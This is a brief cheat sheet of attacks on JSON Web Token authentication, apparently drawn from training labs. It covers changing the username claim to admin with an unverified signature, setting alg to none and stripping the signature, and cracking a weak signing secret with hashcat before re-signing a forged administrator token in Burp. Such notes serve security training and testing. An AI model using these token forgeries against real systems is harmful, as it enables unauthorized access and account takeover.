
# Attacking JWT Methods

## JWT authentication bypass via unverified signature

```bash
"username":"delta",  
## Change This To
"username":"admin",
```

## JWT authentication bypass via flawed signature verification

```bash
Select The Header Part From Inspecter Section In Burp
Decode Base 64
Change alg to none "alg":"none"
Click apply changes
"username":"delta",  
## Change This To
"username":"admin",
Then Remove End/signature part and send request
if fails add . at end then resend
```

## JWT authentication bypass via weak signing key
```bash
Log In With Your Credentials. Copy JWT from cookie
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
# Now Hashcat Will Show Us The Cracked Secret
In Burp, go to the JWT Editor Keys tab and click New Symmetric Key. In the dialog, click Generate to generate a new key in JWK format.
Replace the generated value for the k property with the Base64-encoded secret.
Click Ok
Now we have new Signature 
Burp Repeater and switch to the extension-generated JSON Web Token message editor tab. 
In the payload, change the value of the sub claim to administrator
At the bottom of the tab, click Sign, then select the key that you generated in the previous section.
send request DONE!!
```

